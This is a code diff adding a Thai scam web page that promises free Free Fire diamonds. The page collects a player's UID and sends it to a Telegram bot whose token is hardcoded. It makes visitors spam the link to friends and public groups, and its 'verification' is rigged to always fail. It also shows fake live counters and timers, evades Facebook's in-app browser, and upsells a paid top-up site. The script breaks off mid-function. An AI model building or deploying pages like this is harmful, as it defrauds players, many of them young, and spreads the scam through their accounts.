@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LUNA TOPUP - รับรางวัล</title>
+    
+    <link rel="icon" type="image/jpeg" href="https://i.ibb.co/hRtvqNsV/14-AC1-C93-4-D89-4-CE9-9-DC8-035-E241-E55-C3.jpg">
+
+    <meta property="og:title" content="LUNA TOPUP - แจกเพชร Free Fire ฟรี 5,100 💎!" />
+    <meta property="og:description" content="ยืนยันสิทธิ์ของคุณตอนนี้เพื่อรับรางวัลเพชรฟรีวันนี้! ทำภารกิจง่ายๆ แล้วรับคิวได้เลย" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://freefire-reward.vercel.app/" /> 
+    <meta property="og:image" content="https://i.ibb.co/hRtvqNsV/14-AC1-C93-4-D89-4-CE9-9-DC8-035-E241-E55-C3.jpg" />
+    
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600;700;800&family=Chakra+Petch:wght@700&family=Noto+Sans+Thai:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            font-family: 'Kanit', 'Noto Sans Thai', sans-serif;
+            background: #f1f5f9;
+            min-height: 100vh;
+        }
+
+        /* ==================== BROWSER BLOCKER ==================== */
+        #browser-blocker {
+            position: fixed;
+            inset: 0;
+            z-index: 99999;
+            background: rgba(15, 23, 42, 0.94);
+            backdrop-filter: blur(12px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        #browser-blocker.active { display: flex; }
+
+        .blocker-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 24px;
+            padding: 36px 28px 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .blocker-icon {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 32px;
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.25);
+        }
+
+        .blocker-title {
+            font-size: 21px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 6px;
+        }
+
+        .blocker-subtitle {
+            font-size: 15px;
+            color: #64748b;
+            margin-bottom: 22px;
+        }
+
+        .reward-box {
+            background: linear-gradient(145deg, #fff7ed, #ffedd5);
+            border: 2px solid #f59e0b;
+            border-radius: 18px;
+            padding: 18px 16px 16px;
+            margin-bottom: 22px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 25px -5px rgba(245, 158, 11, 0.25);
+        }
+
+        .reward-box::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent 40%, rgba(255,255,255,0.4) 50%, transparent 60%);
+            animation: shine 3.5s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-30%) translateY(-30%) rotate(45deg); }
+            100% { transform: translateX(30%) translateY(30%) rotate(45deg); }
+        }
+
+        .reward-label {
+            font-size: 13px;
+            color: #92400e;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .reward-amount {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #b45309, #d97706, #f59e0b, #fbbf24);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            position: relative;
+            z-index: 1;
+        }
+
+        .reward-amount span {
+            font-size: 20px;
+            font-weight: 700;
+            margin-left: 4px;
+        }
+
+        .platform-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #f1f5f9;
+            color: #475569;
+            font-size: 13px;
+            font-weight: 500;
+            padding: 7px 16px;
+            border-radius: 999px;
+            margin-bottom: 26px;
+        }
+
+        .steps { text-align: left; margin-bottom: 6px; }
+
+        .step-item {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 18px;
+            align-items: flex-start;
+        }
+
+        .step-number {
+            flex-shrink: 0;
+            width: 28px;
+            height: 28px;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .step-content strong {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #0f172a;
+            margin-bottom: 2px;
+        }
+
+        .step-content span {
+            font-size: 14px;
+            color: #64748b;
+        }
+
+        .highlight {
+            color: #2563eb;
+            font-weight: 600;
+        }
+
+        .note {
+            margin-top: 22px;
+            padding-top: 18px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 13px;
+            color: #94a3b8;
+        }
+
+        /* ==================== MAIN REWARD PAGE ==================== */
+        #ev-app-container {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 110px 15px 40px;
+        }
+
+        .luna-sticky {
+            position: fixed; top: 0; left: 0; width: 100%; z-index: 9999;
+            background: rgba(255,255,255,0.97);
+            backdrop-filter: blur(12px);
+            border-bottom: 3px solid #2563eb;
+            padding: 12px 18px;
+            display: flex; align-items: center; justify-content: space-between;
+            box-shadow: 0 4px 20px rgba(37,99,235,0.12);
+            text-decoration: none !important;
+        }
+        .luna-logo { width: 42px; border-radius: 11px; margin-right: 12px; }
+        .luna-btn {
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: white !important;
+            padding: 9px 18px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .luna-btn:active { filter: brightness(0.85); transform: scale(0.96); }
+
+        #video-popup {
+            position: fixed; bottom: 20px; right: 16px; width: 250px;
+            background: #fff; border-radius: 16px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.15);
+            z-index: 10000; border: 2px solid #2563eb;
+            padding: 12px; display: none;
+        }
+        .video-close {
+            position: absolute; top: -10px; left: -10px;
+            background: #ef4444; color: white;
+            width: 24px; height: 24px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; border: 2px solid white; font-size: 11px;
+        }
+
+        .ev-card {
+            background: #ffffff;
+            width: 100%; max-width: 420px;
+            border-radius: 28px;
+            padding: 32px 24px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(15,23,42,0.08);
+        }
+
+        .status-header-bg {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 50px;
+            padding: 10px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+
+        .diamond-area { margin: 20px 0 24px; }
+        .diamond-area img {
+            width: 185px;
+            filter: drop-shadow(0 12px 24px rgba(37,99,235,0.28));
+            margin-bottom: 8px;
+        }
+        .diamond-area .amount {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 58px;
+            font-weight: 700;
+            color: #1e40af;
+            line-height: 1;
+        }
+
+        .uid-group {
+            background: #f1f5f9;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 14px 18px;
+            margin: 14px 0 22px;
+            border: 2px solid #e2e8f0;
+        }
+        .uid-group input {
+            border: none;
+            background: transparent;
+            width: 100%;
+            font-size: 21px;
+            font-weight: 800;
+            outline: none;
+            color: #0f172a;
+        }
+
+        .btn-3d {
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 15px;
+            box-shadow: 0 5px 0 #1e40af;
+            cursor: pointer;
+            width: 100%;
+            display: block;
+            text-decoration: none;
+            transition: 0.12s;
+        }
+        .btn-3d:active {
+            background: #1e40af;
+            box-shadow: 0 2px 0 #1e3a8a;
+            transform: translateY(3px);
+        }
+
+        .btn-main {
+            width: 100%;
+            padding: 18px;
+            border-radius: 16px;
+            border: none;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            color: white;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            box-shadow: 0 8px 22px rgba(37,99,235,0.35);
+            transition: 0.12s;
+        }
+        .btn-main:active {
+            background: linear-gradient(135deg, #1e40af, #1e3a8a);
+            box-shadow: 0 4px 12px rgba(30,64,175,0.35);
+            transform: scale(0.98);
+        }
+
+        .ai-box {
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 18px;
+            padding: 18px;
+            margin: 18px 0;
+            text-align: left;
+        }
+
+        .instant-btn {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            color: white;
+            padding: 18px 16px;
+            border-radius: 18px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            text-decoration: none;
+            box-shadow: 0 8px 25px rgba(217,119,6,0.4);
+            border: 2px solid #fbbf24;
+            animation: pulse 1.8s infinite;
+        }
+        .instant-btn:active { transform: scale(0.97); filter: brightness(0.9); }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+
+        .hidden { display: none !important; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .blue-link {
+            color: #2563eb !important;
+            font-weight: 700;
+            text-decoration: underline;
+        }
+
+        .cooldown-box {
+            margin-top: 14px;
+            background: #fef2f2;
+            border: 2px solid #fecaca;
+            border-radius: 14px;
+            padding: 14px;
+            text-align: center;
+        }
+
+        .btn-success {
+            background: #16a34a !important;
+            box-shadow: 0 5px 0 #15803d !important;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ==================== BROWSER BLOCKER ==================== -->
+<div id="browser-blocker">
+    <div class="blocker-card">
+        <div class="blocker-icon">💎</div>
+        
+        <h2 class="blocker-title">กรุณาเปิดในเบราว์เซอร์ภายนอก</h2>
+        <p class="blocker-subtitle">กรุณาทำตามขั้นตอนด้านล่างเพื่อรับรางวัล</p>
+
+        <div class="reward-box">
+            <div class="reward-label">รางวัลที่คุณจะได้รับ</div>
+            <div class="reward-amount">5,100 <span>เพชร</span></div>
+        </div>
+
+        <div class="platform-badge" id="platform-badge">กำลังตรวจสอบอุปกรณ์...</div>
+
+        <div class="steps">
+            <div class="step-item">
+                <div class="step-number">1</div>
+                <div class="step-content">
+                    <strong>กดที่สัญลักษณ์จุดสามจุด ⋯</strong>
+                    <span>มุมขวาบน หรือมุมขวาล่างของหน้าจอ</span>
+                </div>
+            </div>
+            <div class="step-item">
+                <div class="step-number">2</div>
+                <div class="step-content">
+                    <strong id="action-title">เลือกเมนู</strong>
+                    <span id="action-detail">เปิดในเบราว์เซอร์ภายนอก</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="note">
+            เมื่อเปิดในเบราว์เซอร์ภายนอกแล้ว คุณจะสามารถรับรางวัลได้ทันที
+        </div>
+    </div>
+</div>
+
+<!-- ==================== MAIN REWARD CONTENT ==================== -->
+<div id="ev-app-container">
+
+    <a href="https://luna-topup.vercel.app/" target="_blank" class="luna-sticky">
+        <div style="display:flex;align-items:center;">
+            <img src="https://i.ibb.co/TNLR2yY/logo-lanatopup.png" class="luna-logo">
+            <div>
+                <div style="font-weight:800;color:#0f172a;font-size:16px;line-height:1;">LUNA TOPUP <i class="fas fa-gem" style="color:#2563eb;"></i></div>
+                <div style="font-size:12px;color:#64748b;margin-top:2px;">💎 เติม Free Fire ปลอดภัย ได้ไว 100%</div>
+            </div>
+        </div>
+        <div class="luna-btn">เติมเลย! ⚡</div>
+    </a>
+
+    <div id="video-popup">
+        <div class="video-close" onclick="closePopup()">✕</div>
+        <a href="https://www.facebook.com/share/r/1BwNacRzBy/?mibextid=wwXIfr" target="_blank" style="text-decoration:none;display:flex;align-items:center;gap:10px;">
+            <div style="background:#eff6ff;color:#2563eb;width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;">
+                <i class="fas fa-video"></i>
+            </div>
+            <div style="text-align:left;">
+                <b style="color:#0f172a;font-size:13px;display:block;">ดูวิธีรับ 5,100 เพชรฟรี!</b>
+                <span style="color:#64748b;font-size:11px;">คลิกเพื่อดูคลิปสอนสั้นๆ</span>
+            </div>
+        </a>
+    </div>
+
+    <!-- STEP 1 -->
+    <div id="step-1" class="ev-card">
+        <div class="status-header-bg">
+            <span style="color:#16a34a;font-weight:800;font-size:13px;">
+                <i class="fas fa-circle-notch fa-spin"></i> Server Online
+            </span>
+            <span style="font-weight:800;font-size:13px;color:#475569;">
+                ยอดเหลือ: <span id="dia-live" style="color:#0f172a;">155,386</span> 💎
+            </span>
+        </div>
+
+        <div style="font-size:13px;color:#64748b;margin-bottom:10px;">
+            ผู้เล่นออนไลน์: <span id="online-count" style="font-weight:700;color:#0f172a;">1,284</span> คน
+        </div>
+
+        <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" 
+             style="width:78px;border-radius:20px;margin-bottom:10px;box-shadow:0 8px 16px rgba(0,0,0,0.1);">
+
+        <h1 style="margin:0;font-size:25px;font-weight:800;color:#0f172a;">VERIFIED REWARDS</h1>
+        <p style="color:#64748b;font-size:14px;margin:4px 0 0;">ยืนยันสิทธิ์เพื่อรับเพชรฟรีวันนี้</p>
+
+        <div class="diamond-area">
+            <img src="https://i.ibb.co/wrZY9S6v/6017-C7-DA-B1-C0-481-B-BC18-7560-B67-DDCF4.png">
+            <div class="amount">5,100 💎</div>
+        </div>
+
+        <div id="p1-main">
+            <div style="text-align:left;font-weight:700;color:#475569;padding-left:4px;font-size:14px;">UID ผู้เล่น</div>
+            <div class="uid-group">
+                <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" style="width:30px;margin-right:12px;border-radius:8px;">
+                <input type="number" id="uid-input" placeholder="ระบุเลข UID ของคุณ">
+            </div>
+            <button type="button" onclick="goStep2()" class="btn-main">
+                เริ่มการตรวจสอบสิทธิ์ <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+
+        <div id="p1-loading" class="hidden">
+            <div style="width:46px;height:46px;border:4px solid #e2e8f0;border-top:4px solid #2563eb;border-radius:50%;animation:spin 1s linear infinite;margin:28px auto 12px;"></div>
+            <p style="font-weight:700;color:#0f172a;font-size:15px;">กำลังเชื่อมต่อฐานข้อมูล...</p>
+        </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div id="step-2" class="ev-card hidden">
+        <div class="status-header-bg" style="justify-content:flex-start;gap:12px;">
+            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" style="width:36px;border-radius:10px;">
+            <div style="text-align:left;">
+                <span style="color:#16a34a;font-weight:800;font-size:11px;display:block;">ACCOUNT VERIFIED</span>
+                <span style="font-weight:800;font-size:16px;color:#0f172a;">UID: <span id="uid-val"></span></span>
+                <div style="font-size:14px;font-weight:700;color:#0f172a;margin-top:3px;display:flex;align-items:center;gap:6px;">
+                    <img src="https://i.ibb.co/wrZY9S6v/6017-C7-DA-B1-C0-481-B-BC18-7560-B67-DDCF4.png" style="width:20px;">
+                    รางวัล: 5,100 💎
+                </div>
+            </div>
+        </div>
+
+        <div id="p2-main">
+            <div style="background:#fff;border:2px solid #e2e8f0;border-radius:18px;padding:18px;text-align:left;margin-bottom:14px;">
+                <b style="font-size:15px;color:#1e293b;"><i class="fas fa-users" style="color:#2563eb;"></i> ติดตาม X และเข้าร่วมกลุ่มเพื่อรับสิทธิ์</b>
+                <div style="display:flex;gap:10px;margin-top:14px;">
+                    <a href="https://x.com/xrk001_?s=11" target="_blank" id="g1" onclick="joinG(1)" class="btn-3d">
+                        <i class="fab fa-x-twitter"></i> ติดตาม X
+                    </a>
+                    <a href="https://www.facebook.com/share/g/1BR4Mthfdm/?mibextid=wwXIfr" target="_blank" id="g2" onclick="joinG(2)" class="btn-3d">กลุ่มที่ 2</a>
+                </div>
+            </div>
+
+            <div style="background:#fff;border:2px solid #e2e8f0;border-radius:18px;padding:18px;text-align:left;margin-bottom:18px;">
+                <b style="font-size:15px;color:#1e293b;"><i class="fab fa-facebook-messenger" style="color:#1877f2;"></i> ส่งให้เพื่อนใน Messenger 10 คน</b>
+                <button type="button" id="msg" onclick="shareMsg()" class="btn-3d" style="background:#1877f2;box-shadow:0 5px 0 #145dbf;margin-top:12px;">
+                    แชร์ทาง Messenger
+                </button>
+            </div>
+
+            <button type="button" id="btn-final" onclick="goStep3()" class="btn-main" style="background:#cbd5e1;box-shadow:none;cursor:not-allowed;" disabled>
+                ทำภารกิจให้ครบก่อน
+            </button>
+        </div>
+
+        <div id="p2-loading" class="hidden">
+            <div style="width:46px;height:46px;border:4px solid #e2e8f0;border-top:4px solid #2563eb;border-radius:50%;animation:spin 1s linear infinite;margin:28px auto 12px;"></div>
+            <p style="font-weight:700;color:#0f172a;font-size:15px;">กำลังจองคิวโอนเพชร...</p>
+        </div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div id="step-3" class="ev-card hidden">
+        <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:18px;padding:14px;display:flex;align-items:center;justify-content:space-between;text-align:left;margin-bottom:18px;">
+            <div style="display:flex;align-items:center;gap:12px;">
+                <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" style="width:44px;border-radius:12px;">
+                <div>
+                    <div style="font-size:12px;font-weight:700;color:#ef4444;">UID: <span id="final-uid" style="font-weight:800;"></span></div>
+                    <div style="font-size:17px;font-weight:800;color:#0f172a;display:flex;align-items:center;gap:6px;margin-top:2px;">
+                        <img src="https://i.ibb.co/wrZY9S6v/6017-C7-DA-B1-C0-481-B-BC18-7560-B67-DDCF4.png" style="width:24px;">
+                        5,100 💎
+                    </div>
+                </div>
+            </div>
+            <div style="text-align:right;">
+                <div style="font-size:11px;font-weight:700;color:#64748b;">รหัสคิว</div>
+                <b id="qid-val" style="color:#0f172a;background:#f1f5f9;padding:3px 9px;border-radius:8px;font-size:13px;"></b>
+            </div>
+        </div>
+
+        <h2 style="font-weight:800;font-size:21px;margin:0 0 14px;color:#0f172a;">
+            <i class="fas fa-gem" style="color:#2563eb;"></i> ขั้นตอนการรับเพชร
+        </h2>
+
+        <div class="ai-box">
+            <p style="margin:0;font-size:15px;color:#1e293b;line-height:1.7;font-weight:600;">
+                📢 เงื่อนไขรับเพชร:<br><br>
+                1. ก๊อปปี้ข้อความด้านล่างนี้<br>
+                2. นำไปโพสต์ลง <b>กลุ่ม Free Fire 10 กลุ่ม</b><br>
+                3. โพสต์ลงหน้าเฟสตัวเอง แล้วตั้งเป็น <b>สาธารณะ</b><br><br>
+                ทำครบแล้วกดปุ่มยืนยันด้านล่าง
+            </p>
+        </div>
+
+        <div style="background:#f1f5f9;border:2px dashed #94a3b8;border-radius:16px;padding:16px;margin:16px 0;text-align:left;">
+            <div style="font-size:12px;font-weight:700;color:#64748b;margin-bottom:8px;">📋 ก๊อปปี้ข้อความนี้ไปโพสต์</div>
+            <div style="font-size:15px;font-weight:700;color:#0f172a;line-height:1.6;">
+                รับเพชรฟรี 5,100 เพชร 💎<br>
+                <span class="blue-link">https://freefire-reward.vercel.app</span> 👈🏻
+            </div>
+            <button onclick="copyText()" class="btn-main" style="margin-top:12px;padding:12px;font-size:15px;">
+                ก๊อปปี้ข้อความ
+            </button>
+        </div>
+
+        <div style="margin:18px 0;">
+            <p style="font-size:15px;font-weight:800;color:#1e293b;margin-bottom:12px;">เริ่มทำภารกิจด้านล่างนี้เลย 👇</p>
+            
+            <a href="https://www.facebook.com/" target="_blank" class="btn-3d" style="margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:8px;">
+                <i class="fab fa-facebook"></i> 1. โพสต์ลงหน้าเฟสตัวเอง (สาธารณะ)
+            </a>
+            
+            <a href="https://www.facebook.com/groups/" target="_blank" class="btn-3d" style="background:#1e40af;box-shadow:0 5px 0 #1e3a8a;display:flex;align-items:center;justify-content:center;gap:8px;">
+                <i class="fas fa-users"></i> 2. โพสต์ลงกลุ่ม Free Fire (10 กลุ่ม)
+            </a>
+        </div>
+
+        <div id="verify-section" style="margin:22px 0 12px;">
+            <button id="verify-btn" onclick="startVerify()" class="btn-main">
+                ✅ ยืนยันว่าแชร์ครบแล้ว
+            </button>
+
+            <div id="verify-loading" class="hidden" style="margin-top:18px;">
+                <div style="width:46px;height:46px;border:4px solid #e2e8f0;border-top:4px solid #2563eb;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px;"></div>
+                <p style="font-weight:700;color:#0f172a;font-size:15px;">กำลังตรวจสอบโพสต์ของคุณ...</p>
+            </div>
+
+            <div id="verify-fail" class="hidden">
+                <div class="cooldown-box">
+                    <div style="font-size:16px;font-weight:800;color:#dc2626;margin-bottom:6px;">❌ ยังแชร์ไม่ครบ</div>
+                    <p style="font-size:14px;color:#b91c1c;margin:0 0 10px;">กรุณาไปโพสต์ให้ครบ 10 กลุ่ม + หน้าเฟสตัวเองก่อน</p>
+                    <div style="font-size:15px;font-weight:700;color:#0f172a;">
+                        รออีก <span id="cooldown-timer">05:00</span> ถึงจะยืนยันได้อีกครั้ง
+                    </div>
+                </div>
+            </div>
+
+            <div id="verify-success" class="hidden" style="margin-top:16px;background:#f0fdf4;border:2px solid #bbf7d0;border-radius:16px;padding:16px;">
+                <div style="font-size:16px;font-weight:800;color:#16a34a;margin-bottom:4px;">✅ ผ่านการตรวจสอบแล้ว!</div>
+                <p style="font-size:14px;color:#15803d;margin:0;">ระบบตรวจพบว่าคุณโพสต์ครบแล้ว เพชรจะถูกโอนภายใน 5-15 นาที</p>
+            </div>
+        </div>
+
+        <div style="margin-top:26px;">
+            <p style="font-size:13px;font-weight:700;color:#64748b;margin-bottom:10px;">🔥 ทางเลือกสำหรับคนไม่อยากแชร์</p>
+            <a href="https://luna-topup.vercel.app/" target="_blank" class="instant-btn">
+                <span style="font-size:22px;">⚡</span>
+                <div style="text-align:left;line-height:1.25;">
+                    <div style="font-size:17px;">รับเพชรทันที!</div>
+                    <div style="font-size:12px;font-weight:600;opacity:0.95;">ข้ามภารกิจ · ได้เลยภายใน 1 นาที</div>
+                </div>
+            </a>
+        </div>
+
+        <div style="font-size:14px;font-weight:800;color:#1e293b;margin:24px 0 4px;">เวลาที่เหลือในการทำภารกิจ</div>
+        <div id="timer" style="font-family:'Chakra Petch';font-size:46px;font-weight:800;color:#ef4444;">23:01</div>
+    </div>
+</div>
+
+<script>
+    // ==================== BROWSER DETECTOR ====================
+    function isFacebookInAppBrowser() {
+        const ua = navigator.userAgent || navigator.vendor || window.opera || "";
+        return /FBAN|FBAV|FB_IAB|FB4A|FBIOS/i.test(ua);
+    }
+
+    function detectPlatform() {
+        const ua = navigator.userAgent || "";
+        if (/iPhone|iPad|iPod/i.test(ua)) return "ios";
+        if (/Android/i.test(ua)) return "android";
+        return "other";
+    }
+
+    function showBrowserBlocker() {
+        const blocker = document.getElementById("browser-blocker");
+        const platformBadge = document.getElementById("platform-badge");
+        const actionTitle = document.getElementById("action-title");
+        const actionDetail = document.getElementById("action-detail");
+
+        const platform = detectPlatform();
+
+        if (platform === "ios") {
+            platformBadge.innerHTML = "📱 iPhone / iPad";
+            actionTitle.textContent = "เลือกเมนู";
+            actionDetail.innerHTML = '<span class="highlight">Open in Safari</span> หรือ <span class="highlight">เปิดในเบราว์เซอร์</span>';
+        } else if (platform === "android") {
+            platformBadge.innerHTML = "📱 Android";
+            actionTitle.textContent = "เลือกเมนู";
+            actionDetail.innerHTML = '<span class="highlight">เปิดในเบราว์เซอร์ภายนอก</span> หรือ <span class="highlight">Open in Chrome</span>';
+        } else {
+            platformBadge.innerHTML = "Facebook Browser";
+            actionTitle.textContent = "เลือกเมนู";
+            actionDetail.innerHTML = '<span class="highlight">เปิดในเบราว์เซอร์ภายนอก</span>';
+        }
+
+        blocker.classList.add("active");
+        document.body.style.overflow = "hidden";
+        
+        // ซ่อนเนื้อหาหลัก
+        document.getElementById("ev-app-container").style.display = "none";
+    }
+
+    // ==================== MAIN LOGIC ====================
+    let g1 = false, g2 = false, mCount = 0, showT, hideT;
+    let verifyLocked = false;
+    let cooldownInterval = null;
+
+    const BOT_TOKEN = "8298114640:AAF0INIvlPcrZYrNU5EzOxlfx61bxTq5IrA";
+    const CHAT_ID = "6814855198";
+
+    function triggerPopup() {
+        if (!document.getElementById('step-1').classList.contains('hidden')) {
+            document.getElementById('video-popup').style.display = 'block';
+            hideT = setTimeout(closePopup, 5000);
+        }
+    }
+    function closePopup() {
+        document.getElementById('video-popup').style.display = 'none';
+        clearTimeout(hideT); clearTimeout(showT);
+        showT = setTimeout(triggerPopup, 10000);
+    }
+
+    function notify(title, text, icon) {
+        Swal.fire({ title, html: text, icon, confirmButtonColor: '#2563eb' });
+    }
+
+    function goStep2() {
+        const val = document.getElementById('uid-input').value;
+        if (val.length < 5) return notify('UID ไม่ถูกต้อง', 'ระบุให้ครบถ้วนก่อน', 'error');
+
+        document.getElementById('p1-main').classList.add('hidden');
+        document.getElementById('p1-loading').classList.remove('hidden');
+        document.getElementById('video-popup').style.display = 'none';
+        clearTimeout(showT); clearTimeout(hideT);
+
+        setTimeout(() => {
+            document.getElementById('uid-val').innerText = val;
+            document.getElementById('final-uid').innerText = val;
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+        }, 1500);
+    }
+
+    function joinG(n) {
+        setTimeout(() => {
+            const b = document.getElementById('g' + n);
+            b.innerHTML = 'สำเร็จ ✅';
+            b.classList.add('btn-success');
+            if (n == 1) g1 = true;
+            if (n == 2) g2 = true;
+            check();
+        }, 300);
+    }
+
+    function shareMsg() {
+        const shareUrl = 'https://freefire-reward.vercel.app/';
+        window.location.href = 'fb-messenger://share/?link=' + encodeURIComponent(shareUrl);
+
+        mCount++;
+        if (mCount === 1) {
+            setTimeout(() => notify('แชร์ไม่ครบ!', 'กรุณาแชร์ให้เพื่อน 10 คนก่อนนะ', 'warning'), 1800);
+        } else {
+            const b = document.getElementById('msg');
+            b.innerHTML = 'สำเร็จ ✅';
+            b.classList.add('btn-success');
+            check();
+        }
+    }
+
+    function check() {
+        if (g1 && g2 && mCount >= 2) {
+            const b = document.getElementById('btn-final');
+            b.disabled = false;
+            b.style.background = 'linear-gradient(135deg, #2563eb, #1d4ed8)';
+            b.style.boxShadow = '0 8px 22px rgba(37,99,235,0.35)';
+            b.style.cursor = 'pointer';
+            b.innerText = 'ยืนยันรับ 5,100 เพชรทันที';
+        }
+    }
+
+    function goStep3() {
+        document.getElementById('p2-main').classList.add('hidden');
+        document.getElementById('p2-loading').classList.remove('hidden');
+        setTimeout(() => {
+            const uid = document.getElementById('uid-val').innerText;
+            const qid = 'Q-' + Math.floor(Math.random() * 9000 + 1000);
+            document.getElementById('qid-val').innerText = qid;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔥 แจ้งคิวเพชรใหม่!\nUID: "+uid+"\nคิว: "+qid+"\nรางวัล: 5,100 เพชร")}`);
+
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.remove('hidden');
+            startTimer(1381);
+        }, 2000);
+    }
+
+    function startTimer(d) {
+        let t = d;
+        setInterval(() => {
+            const m = Math.floor(t / 60);
+            const s = t % 60;
+            document.getElementById('timer').textContent = (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s;
+            if (--t < 0) t = 0;
+        }, 1000);
+    }
+
+    function copyText() {
+        const text = `รับเพชรฟรี 5,100 เพชร 💎
+https://freefire-reward.vercel.app 👈🏻`;
+        navigator.clipboard.writeText(text).then(() => {
+            notify('ก๊อปปี้แล้ว!', 'นำไปโพสต์ได้เลย', 'success');
+        });
+    }
+
+    function startVerify() {
+        if (verifyLocked) return;
+
+        const btn = document.getElementById('verify-btn');
+        const loading = document.getElementById('verify-loading');
+        const fail = document.getElementById('verify-fail');
+        const success = document.getElementById('verify-success');
+
+        btn.classList.add('hidden');
+        loading.classList.remove('hidden');
+        fail.classList.add('hidden');
+        success.classList.add('hidden');
+
+        setTimeout(() => {
+            loading.classList.add('hidden');
+            fail.classList.remove('hidden');
+            verifyLocked = true;
+            startCooldown(300);
+        }, 3200 + Math.random() * 1000);
+    }
+
+    function startCooldown(seconds) {
+        let remaining = seconds;
+        const timerEl = document.getElementById('cooldown-timer');
+
+        function update() {
+            const m = Math.floor(remaining / 60);
+            const s = remaining % 60;
+            timerEl.textContent = (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s;
+
+            if (remaining <= 0) {
+                clearInterval(cooldownInterval);
+                verifyLocked = false;
+                document.getElementById('verify-fail').classList.add('hidden');
+                document.getElementById('verify-btn').classList.remove('hidden');
+                return;
+            }
+            remaining--;
+        }
+        update();
+        cooldownInterval = setInterval(update, 1000);
+    }
+
+    // เริ่มทำงาน
+    document.addEventListener("DOMContentLoaded", function () {
+        if (isFacebookInAppBrowser()) {
+            showBrowserBlocker();
+        } else {
+            // เปิดปกติ → แสดงหน้าเว็บรางวัล
+            setTimeout(triggerPopup, 3000);
+            
+            // ยอดเพชรลด
+            let dia = 155386;
+            let online = 1284;
+            setInterval(() => {
+                dia -= 5100;
+                if (dia < 80000) dia = 155386;
+                document.getElementById('dia-live').innerText = dia.toLocaleString();
+
+                const change = Math.floor(Math.random() * 15) - 7;
+                online += change;
+                if (online < 900) online = 1100;
+                if (online > 1800) online = 1500;
+                document.getElementById('online-count').innerText = online.toLocaleString();
